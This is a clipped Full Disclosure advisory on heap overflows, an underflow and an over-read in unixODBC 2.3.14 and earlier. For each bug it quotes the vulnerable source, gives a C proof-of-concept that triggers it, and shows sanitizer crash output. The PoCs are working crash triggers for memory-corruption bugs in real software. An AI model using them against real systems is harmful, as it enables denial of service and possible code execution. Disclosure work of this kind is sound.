---
title: unixODBC <=2.3.14 Multiple Heap Buffer Overflows, Underflows, and Over-Reads
source: https://seclists.org/fulldisclosure/2026/Nov/8
source_host: seclists.org
clip_date: 2026-11-08T03:17:27+08:00
trace_id: 667dc467-ffed-4921-9e9d-d7c9613a70c8
content_hash: 04454dc944c011a01048e9071e9f3e13909ab0c32b2798cf2733692f0b1961e7
status: synced
tags: []
series: null
feed_source: Full Disclosure·漏洞披露
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41175244-d011-8144-9d05-c868fe43d9f5
ioc: null
---

## Full Disclosure mailing list archives

## unixODBC <=2.3.14 Multiple Heap Buffer Overflows, Underflows, and Over-Reads

* * *

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>  
*Date*: Wed, 4 Nov 2026 00:40:34 +0000  

* * *

````r
unixODBC versions 2.3.14 and below contain multiple heap buffer overflows, underflows, and over-reads.  Attackers who 
can influence various arguments passed thereto can trigger the heap-based buffer overflows inside of the unixODBC 
driver manager itself, potentially corrupting the shared heap state across connections, crash the driver manager 
(thereby causing denial of service conditions, multi-tenant data loss, and such related issues, depending on how the 
calling information system leverages the library and is architected), information disclosure, and execute arbitrary 
code, among other things.  Importantly, the unixODBC was also found to contain race conditions, integer underflows, 
double-free/use-after-free, null pointer dereference, stack buffer overflows, and numerous other issues.  We may or may 
not write those issues up, but this was all from a cursory glance through the code.

Examples
Sample Heap Buffer Overflows
While at least 8 different heap-based buffer overflows were discovered, the following serves as a blueprint to find 
both the examples below and other instances.

SQLExecDirect's Unvalidated Caller-Supplied Length
When call tracing is enabled, `SQLExecDirect` allocates its trace-log buffer using the caller-supplied `text_length`, 
doing so before verifying that the value is valid.  Attackers that pass a negative, non-`SQL_NTS` value, as such, cause 
a negative value to be sent to the `sprintf` call, which standard C treats as "no precision given", turning the call 
into an unbounded `%s` of the full, attacker-controlled `statement_text` string, overflowing the buffer.  Importantly, 
this same mistake is made elsewhere, such as in `SQLPrepare`'s lines 185-189 which appears to be a copy-paste of the 
offending code.

```c
SQLRETURN SQLExecDirect( SQLHSTMT statement_handle,
           SQLCHAR *statement_text,
           SQLINTEGER text_length )
{
    DMHSTMT statement = (DMHSTMT) statement_handle;
    SQLRETURN ret;
    SQLCHAR *s1;
    SQLCHAR s2[ 100 + LOG_MESSAGE_LEN ];

    /*
     * check statement
     */

    if ( !__validate_stmt( statement ))
    {
        dm_log_write( __FILE__,
                    __LINE__,
                    LOG_INFO,
                    LOG_INFO,
                    "Error: SQL_INVALID_HANDLE" );

        return SQL_INVALID_HANDLE;
    }

    function_entry( statement );

    if ( log_info.log_flag )
    {
        /*
         * allocate some space for the buffer
         */

        if ( statement_text && text_length == SQL_NTS )
        {
            s1 = malloc( strlen((char*) statement_text ) + LOG_MESSAGE_LEN );
        }
        else if ( statement_text )
        {
            s1 = malloc( text_length + LOG_MESSAGE_LEN );
        }
        else
        {
            s1 = malloc( LOG_MESSAGE_LEN );
        }

        sprintf( statement -> msg, "\n\t\tEntry:\
\n\t\t\tStatement = %p\
\n\t\t\tSQL = %s",
                statement,
                __string_with_length( s1, statement_text, text_length ));

        free( s1 );

        dm_log_write( __FILE__,
                __LINE__,
                LOG_INFO,
                LOG_INFO,
                statement -> msg );
    }
```
Snippet from `unixODBC`'s DriverManager/SQLExecDirect.c, lines 184-242

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sql.h>
#include <sqlext.h>

int main(void)
{
    SQLHENV henv = SQL_NULL_HENV;
    SQLHDBC hdbc = SQL_NULL_HDBC;
    SQLHSTMT hstmt = SQL_NULL_HSTMT;
    SQLRETURN rc;

    SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
    SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
    SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

    /* Enable the tracing */
    SQLSetConnectAttr(hdbc, SQL_ATTR_TRACE, (SQLPOINTER)SQL_OPT_TRACE_ON, 0);

    /* Connect so that a valid STMT handle can be allocated -- the
     * overflow itself happens before any call reaches the driver. */
    rc = SQLConnect(hdbc, (SQLCHAR*)"test", SQL_NTS,
                     (SQLCHAR*)"", SQL_NTS, (SQLCHAR*)"", SQL_NTS);
    if (!SQL_SUCCEEDED(rc) && rc != SQL_SUCCESS_WITH_INFO) { return 2; }
    SQLAllocHandle(SQL_HANDLE_STMT, hdbc, &hstmt);

    /* Long, fully attacker-controlled SQL text. */
    size_t biglen = 8192;
    char *big_sql = malloc(biglen + 1);
    memset(big_sql, 'A', biglen);
    big_sql[biglen] = '\0';

    /* Negative text_length != SQL_NTS(-3) -> malloc(-50+128)=78
     * bytes, then __string_with_length's sprintf("%.*s", -50, ...)
     * treats the negative precision as "no precision", copying the
     * full 8192-byte string into the 78-byte buffer. */
    SQLExecDirect(hstmt, (SQLCHAR*)big_sql, -50);

    free(big_sql);
    return 0;
}
```
Sample code to overflow the buffer

```text
SQLAllocHandle(ENV) rc=0
SQLAllocHandle(DBC) rc=0
SQLSetConnectAttr(SQL_ATTR_TRACE, ON) rc=0
SQLConnect("test") rc=0
SQLAllocHandle(STMT) rc=0
Calling SQLExecDirect with text_length=-50, statement_text len=8192
=================================================================
==1301501==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x607000001f0e at pc 0x000000440c43 bp 
0x7ffeee29bc20 sp 0x7ffeee29b3c0
WRITE of size 8209 at 0x607000001f0e thread T0
    #0 0x440c42 in __interceptor_vsprintf ...
    #1 0x441c37 in sprintf ...
    #2 0x7fa07e8ac894 in __string_with_length DriverManager/__info.c
    #3 0x7fa07e7ba507 in SQLExecDirect DriverManager/SQLExecDirect.c:235:17
    #4 0x4dedd9 in main repro.c:87:10
...
0x607000001f0e is located 0 bytes to the right of 78-byte region [0x607000001ec0,0x607000001f0e)
allocated by thread T0 here:
    #0 0x4a3492 in __interceptor_malloc ...
    #1 0x7fa07e7ba4d1 in SQLExecDirect DriverManager/SQLExecDirect.c
    #2 0x4dedd9 in main repro.c:87:10
...
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in __interceptor_vsprintf
==1301501==ABORTING
```
Output from AddressSanitizer

```text
==1301663== Invalid write of size 8
==1301663==    at 0x4854166: mempcpy (vg_replace_strmem.c:1668)
==1301663==    by 0x49843F7: _IO_default_xsputn (in /usr/lib64/libc.so.6)
==1301663==    by 0x4960212: __vfprintf_internal (in /usr/lib64/libc.so.6)
==1301663==    by 0x4978C23: __vsprintf_internal (in /usr/lib64/libc.so.6)
==1301663==    by 0x495AFC7: sprintf (in /usr/lib64/libc.so.6)
==1301663==    by 0x48BA2E5: __string_with_length (__info.c:3242)
==1301663==    by 0x487AD7B: SQLExecDirect (SQLExecDirect.c:231)
==1301663==    by 0x401404: main (repro.c:87)
==1301663==  Address 0x4c78db1 is 8,033 bytes inside an unallocated block of size 2,711,952 in arena "client"

valgrind: m_mallocfree.c:303 (get_bszB_as_is): Assertion 'bszB_lo == bszB_hi' failed.
valgrind: Heap block lo/hi size mismatch: lo = 144, hi = 4702111234474983745.
```
Output from Valgrind

ODBCINSTSetProperty's Unbounded Property Name/Value Copy
Per the code below, `ODBCINSTAddProperty()` allocates a fixed-size `ODBCINSTPROPERTY` structure and then copies the 
caller-supplied `pszProperty` and `pszValue` `char[]`s into its `szName` and `szValue` fields without a `NULL` or 
length check.

```c
int ODBCINSTAddProperty( HODBCINSTPROPERTY hFirstProperty, char *pszProperty, char *pszValue )
{
    HODBCINSTPROPERTY hNew;

                hNew                                                                                   = 
(HODBCINSTPROPERTY)malloc( sizeof(ODBCINSTPROPERTY) );
                memset(hNew, 0, sizeof(ODBCINSTPROPERTY));
                hNew->nPromptType                                   = ODBCINST_PROMPTTYPE_HIDDEN;
                hNew->pNext                                                  = NULL;
    hNew->bRefresh                                                        = 0;
    hNew->hDLL                                                                = hFirstProperty->hDLL;
    hNew->pWidget                                                         = NULL;
    hNew->pszHelp                                                         = NULL;
                hNew->aPromptData                                  = NULL;
                strcpy(hNew->szName, pszProperty );
                strcpy( hNew->szValue, pszValue );
```
Code from `unixODBC`'s odbcinst/ODBCINSTSetProperty.c, lines 54-68

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <odbcinstext.h>

int main(void)
{
    ODBCINSTPROPERTY head;
    char *evil;
    size_t n = 5000;             /* > INI_MAX_PROPERTY_NAME/VALUE (1000) */

    memset(&head, 0, sizeof(head));
    strcpy(head.szName, "Driver");   /* seed list head so AddProperty can walk pNext */
    head.pNext = NULL;
    head.hDLL = NULL;

    evil = malloc(n + 1);
    memset(evil, 'A', n);
    evil[n] = '\0';

    fprintf(stderr, "calling ODBCINSTAddProperty with %zu-byte property name/value...\n", n);

    /* pszProperty and pszValue are each 5000 bytes; hNew->szName/szValue
     * (heap, inside a malloc(sizeof(ODBCINSTPROPERTY)) chunk) are only
     * 1001 bytes each -> two separate heap overflows. */
    ODBCINSTAddProperty(&head, evil, evil);

    printf("reached end (heap likely corrupted)\n");
    free(evil);
    return 0;
}
```
Sample code to overflow the buffer

```text
calling ODBCINSTAddProperty with 5000-byte property name/value...
=================================================================
==1300489==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d000000888 at pc 0x00000048d469 bp 
0x7fffcabae780 sp 0x7fffcabadf48
WRITE of size 5001 at 0x61d000000888 thread T0
    #0 0x48d468 in strcpy (repro_asan+0x48d468)
    #1 0x7f10d0722e05 in ODBCINSTAddProperty odbcinst/ODBCINSTSetProperty.c:67:2
    #2 0x4debdf in main repro.c:26:5
0x61d000000888 is located 0 bytes to the right of 2056-byte region [0x61d000000080,0x61d000000888)
allocated by thread T0 here:
    #0 0x4a3452 in __interceptor_malloc (repro_asan+0x4a3452)
    #1 0x7f10d0722bf5 in ODBCINSTAddProperty odbcinst/ODBCINSTSetProperty.c:58:33
    #2 0x4debdf in main repro.c:26:5
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in strcpy
==1300489==ABORTING
```
Output from AddressSanitizer

```text
calling ODBCINSTAddProperty with 5000-byte property name/value...
==1300550== Invalid write of size 1
==1300550==    at 0x484C75C: strcpy (vg_replace_strmem.c:553)
==1300550==    by 0x485F2CC: ODBCINSTAddProperty (ODBCINSTSetProperty.c:67)
==1300550==    by 0x40123D: main (repro.c:26)
==1300550==  Address 0x4a94c18 is 0 bytes after a block of size 2,056 alloc'd
==1300550==    at 0x484686F: malloc (vg_replace_malloc.c:381)
==1300550==    by 0x485F231: ODBCINSTAddProperty (ODBCINSTSetProperty.c:58)
==1300550==    by 0x40123D: main (repro.c:26)
valgrind: m_mallocfree.c:303 (get_bszB_as_is): Assertion 'bszB_lo == bszB_hi' failed.
valgrind: Heap block lo/hi size mismatch: lo = 2128, hi = 4702111234474983745.
This is probably caused by your program erroneously writing past the
end of a heap block and corrupting heap metadata.
```
Output from Valgrind Memcheck

Template Driver's SQLConnect Unchecked Copy
The template driver provides sample/boilerplate Structured Query Language (SQL) connect code, but this code does not 
perform input validation against the upstream data source `char[]`, allowing an overflow on the corresponding `sprintf` 
call while creating what is supposed to be a diagnostic message pending the connection attempt.  The length of the data 
sources (`szDataSource`) isn't checked until after the overflow has already occurred -- via `( strlen((char*) 
szDataSource ) > ODBC_FILENAME_MAX+INI_MAX_OBJECT_NAME` -- but even this check is incorrect because `szSqlMsg` is only 
1024-bytes and the maths above allows thousands more bytes than that.  Importantly, the `MiniSQL` sample driver's 
`SQLConnect` contains the same issue caused by the same faulty ordering, logic, and lack of verification.  This example 
and the MiniSQL example mentioned herein only really matter if the sample/boilerplate code is leveraged by a library 
but should be fixed since such code is supposed to aid developers.

```c
SQLRETURN SQLConnect(        SQLHDBC        hDrvDbc,
                                                                                                SQLCHAR        
*szDataSource,
                                                                                                SQLSMALLINT    
nDataSourceLength,
                                                                                                SQLCHAR        *szUID,
                                                                                                SQLSMALLINT    
nUIDLength,
                                                                                                SQLCHAR        *szPWD,
                                                                                                SQLSMALLINT    
nPWDLength
                          )
{
                HDRVDBC          hDbc     = (HDRVDBC)hDrvDbc;
    char                   szDATABASE[INI_MAX_PROPERTY_VALUE+1];
    char                   szHOST[INI_MAX_PROPERTY_VALUE+1];
    char                   szPORT[INI_MAX_PROPERTY_VALUE+1];
    char                   szFLAG[INI_MAX_PROPERTY_VALUE+1];

    /* SANITY CHECKS */
    if( SQL_NULL_HDBC == hDbc )
                                return SQL_INVALID_HANDLE;

                sprintf((char*) hDbc->szSqlMsg, "hDbc=$%08lX 3zDataSource=(%s)", (long)hDbc, szDataSource );
                logPushMsg( hDbc->hLog, __FILE__, __FILE__, __LINE__, LOG_WARNING, LOG_WARNING,(char*) hDbc->szSqlMsg );

    if( hDbc->bConnected == 1 )
    {
                                logPushMsg( hDbc->hLog, __FILE__, __FILE__, __LINE__, LOG_WARNING, LOG_WARNING, 
"SQL_ERROR Already connected" );
        return SQL_ERROR;
    }

    if ( nDataSourceLength == SQL_NTS )
    {
        if ( strlen((char*) szDataSource ) > ODBC_FILENAME_MAX+INI_MAX_OBJECT_NAME )
        {
            logPushMsg( hDbc->hLog, __FILE__, __FILE__, __LINE__, LOG_WARNING, LOG_WARNING, "SQL_ERROR Given Data 
Source is too long. I consider it suspect." );
            return SQL_ERROR;
        }
    }
    else
    {
        if ( nDataSourceLength > ODBC_FILENAME_MAX+INI_MAX_OBJECT_NAME )
        {
            logPushMsg( hDbc->hLog, __FILE__, __FILE__, __LINE__, LOG_WARNING, LOG_WARNING, "SQL_ERROR Given Data 
Source is too long. I consider it suspect." );
            return SQL_ERROR;
        }
    }
```
Code snippet from `unixODBC`'s Drivers/template/SQLConnect.c, lines 16-59

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sql.h"
#include "sqlext.h"
#include "driver.h"

extern SQLRETURN SQLAllocConnect( HDRVENV hDrvEnv, HDRVDBC *phDbc );
extern SQLRETURN SQLConnect( HDRVDBC hDrvDbc, SQLCHAR *szDataSource,
    SQLSMALLINT cbDataSource, SQLCHAR *szUID, SQLSMALLINT cbUID,
    SQLCHAR *szAuthStr, SQLSMALLINT cbAuthStr );

int main( void )
{
    HDRVDBC hDbc = NULL;
    SQLAllocConnect( NULL, &hDbc );

    size_t len = 1999; /* > 1024-byte szSqlMsg, well under the ~5096-byte
                           length-sanity threshold the function checks
                           only AFTER the overflowing sprintf() */
    char *dsn = malloc( len + 1 );
    memset( dsn, 'A', len );
    dsn[ len ] = '\0';

    printf( "[repro] calling sample-driver SQLConnect() with a %zu-byte data source name...\n", len );
    SQLConnect( hDbc, (SQLCHAR *) dsn, (SQLSMALLINT) len, NULL, 0, NULL, 0 );

    free( dsn );
    return 0;
}
```
Sample code to overflow the buffer

```text
[info] DRVDBC heap block at 0x619000000580, sizeof(DRVDBC)=1088 bytes, szSqlMsg field size (LOG_MSG_MAX)=1024 bytes
[info] calling SQLConnect() with a 1999-byte data source name ...
==1343590==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6190000009c0 at pc 0x000000440bf3 bp 
0x7fffad3c7b60 sp 0x7fffad3c7300
WRITE of size 2034 at 0x6190000009c0 thread T0
    #0 0x440bf3 in __interceptor_vsprintf
    #1 0x440bf3 in sprintf
    #2 0x4deba7 in SQLConnect template/SQLConnect.c:35:2
    #3 0x4e0876 in main main.c:64:11
0x6190000009c0 is located 0 bytes to the right of 1088-byte region [0x619000000580,0x6190000009c0)
allocated by thread T0 here:
    #0 0x4a358c in __interceptor_malloc
    #1 0x4df3a0 in _AllocConnect template/SQLAllocConnect.c:44:23
    #2 0x4e0876 in main main.c:64:11
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in __interceptor_vsprintf
==1343590==ABORTING
```
Output from AddressSanitizer

Sample Heap Buffer Underflow
While there are several examples, such as in `isql` where a unvalidated integer is accepted from the commandline and 
passed straight to `memset` calls, we will stick with showing one due to vended code from `libltdl`, flowing through 
`unixODBC` because it shows a more interesting underflow that is seen less often.  Specifically, `foreach_dirinpath()` 
in `libltdl/ltdl.c` iterates the colon-separated components of a driver search path -- the process's user search path 
and then `getenv("LTDL_LIBRARY_PATH")` -- and, for each component, builds a candidate `dir/base_name` into a newly 
allocated `filename` buffer.  `canonicalize_path()` can reduce a path component to an empty string -- for example, a 
path ending in a bare trailing colon, such as `"/foo:/"`, canonicalises to `"/foo:"`,  while splitting that on `:` via 
`argz_create_sep()` yields a genuine zero-length entry.  When `foreach_dirinpath()` receives said zero-length 
`dir_name`, `lendir` is `0` and the bounds check `filename[lendir - 1] != '/'` computes `lendir - 1` as an unsigned 
`size_t` subtraction that wraps to `SIZE_MAX`, turning the array index into pointer arithmetic that reads one byte 
immediately before the just-allocated structure.

This path is reached from ODBC's `SQLConnect()` and `SQLDriverConnect()` methods, both of which resolve a bare, 
path-less `DRIVER=` value and pass it to `lt_dlopen()`, which calls `try_dlopen()` -> `find_handle()` -> 
`foreach_dirinpath()` against `LTDL_LIBRARY_PATH` whenever the driver name doesn't contain a directory component.  For 
the sake of brevity, we will skip the code snippets containing this issue and the path thereto, simply providing the 
steps to reproduce and the above, which anyone can trace through.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sql.h>
#include <sqlext.h>

int main(void)
{
    SQLHENV henv = SQL_NULL_HENV;
    SQLHDBC hdbc = SQL_NULL_HDBC;
    SQLCHAR outstr[1024];
    SQLSMALLINT outstrlen;
    SQLRETURN ret;

    SQLCHAR connstr[] = "DRIVER=does_not_exist_trigger.so;";

    SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
    SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (void *) SQL_OV_ODBC3, 0);
    SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

    ret = SQLDriverConnect(hdbc, NULL, connstr, SQL_NTS,
                            outstr, sizeof(outstr), &outstrlen,
                            SQL_DRIVER_NOPROMPT);

    printf("SQLDriverConnect returned %d\n", (int) ret);

    SQLFreeHandle(SQL_HANDLE_DBC, hdbc);
    SQLFreeHandle(SQL_HANDLE_ENV, henv);
    return 0;
}
```
Sample code to cause the underflow (note that you should set the `LTDL_LIBRARY_PATH` to something like `/tmp:/`, as 
mentioned in the write-up above)

```text
ltdl.c:722:10: runtime error: addition of unsigned offset to 0x604000000110 overflowed to 0x60400000010f
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ltdl.c:722:10 in
==1308271==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60400000010f at pc 0x0000004e4f29 bp 
0x7ffdc200ffd0 sp 0x7ffdc200ffc8
READ of size 1 at 0x60400000010f thread T0
    #0 0x4e4f28 in foreach_dirinpath .../libltdl/ltdl.c:722:10
    #1 0x4e2cd4 in find_handle .../libltdl/ltdl.c:809:8
    #2 0x4e2cd4 in try_dlopen .../libltdl/ltdl.c:1469:10
    #3 0x4e15cb in lt_dlopenadvise .../libltdl/ltdl.c:1671:11
    #4 0x4e15cb in lt_dlopen .../libltdl/ltdl.c:1626:10
    #5 0x4dfac2 in main .../ltdl_direct.c:11:9
0x60400000010f is located 1 bytes to the left of 38-byte region [0x604000000110,0x604000000136)
allocated by thread T0 here:
    #1 0x4eec2a in lt__malloc .../libltdl/lt__alloc.c:55:16
    #2 0x4e4b98 in foreach_dirinpath .../libltdl/ltdl.c:712:15
SUMMARY: AddressSanitizer: heap-buffer-overflow .../libltdl/ltdl.c:722:10 in foreach_dirinpath
```
Output from AddressSanitizer

Sample Heap Buffer Over-Reads
While more examples exist, we will end with just this one (because this is long enough).

Fixed-Length Over-Read in SQLConnectW's Unicode-to-ANSI Conversion
The following example is a fixed-length over-read caused when ` SQLConnectW` converts the caller's Unicode credentials 
to ANSI by passing the destination buffer's fixed size, rather than the source string's actual length, as the source 
length to `unicode_to_ansi_copy` whenever the caller specifies `SQL_NTS` for either argument's length.  This means 
that, regardless of the length of the caller's string, a fixed-size read is performed against the source buffer.  
Importantly, the code includes both an overflow and an over-read.

```c
    if ( connection && connection -> iconv_cd_uc_to_ascii != (iconv_t)(-1))
    {
        size_t ret;
        size_t inbl = buffer_len * sizeof( SQLWCHAR );
        size_t obl = dest_len;
        char *ipt = (char*)src;
        char *opt = (char*)dest;

        if (( ret = iconv( connection -> iconv_cd_uc_to_ascii,
                    (ICONV_CONST char**)&ipt, &inbl,
                    &opt, &obl )) != (size_t)(-1))
        {
                                mutex_iconv_exit();

            if ( clen )
            {
                *clen = opt - dest;
            }
                        /* Null terminate outside of iconv, so that the length returned does not include the null 
terminator. */
            if ( obl )
            {
                            *opt = '\0';
            }
            return dest;
        }
    }
```
Code snippet from `unixODBC`'s DriverManager/__info.c, lines 807-832

```c
#include <sql.h>
#include <sqlext.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    SQLHENV henv; SQLHDBC hdbc;
    SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
    SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
    SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

    const char *name = "test"; /* replace with your own DSN name */
    SQLWCHAR dsn[16];
    size_t n = strlen(name);
    for (size_t i = 0; i < n; i++) dsn[i] = (SQLWCHAR)name[i];
    dsn[n] = 0;

    /* A correctly null-terminated, 1-element (empty) UID. */
    SQLWCHAR uid[1] = {0};

    SQLRETURN rc = SQLConnectW(hdbc, dsn, SQL_NTS, uid, SQL_NTS, NULL, 0);
    printf("rc=%d (a crash is expected before this prints under AddressSanitizer)\n", rc);
    return 0;
}
```
Sample code to cause the over-read

```text
==ERROR: AddressSanitizer: stack-buffer-overflow on address ... thread T0
READ of size 66 at ... thread T0
    #0 ... in iconv
    #1 ... in unicode_to_ansi_copy DriverManager/__info.c:812
    #2 ... in SQLConnectW DriverManager/SQLConnectW.c
    #3 ... in main

Address ... is located in stack of thread T0 ...
  This frame has 4 object(s):
    ...
    'uid' (line 22) <== Memory access ... overflows this variable

SUMMARY: AddressSanitizer: stack-buffer-overflow ... in iconv
```
Output from AddressSanitizer
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/

````
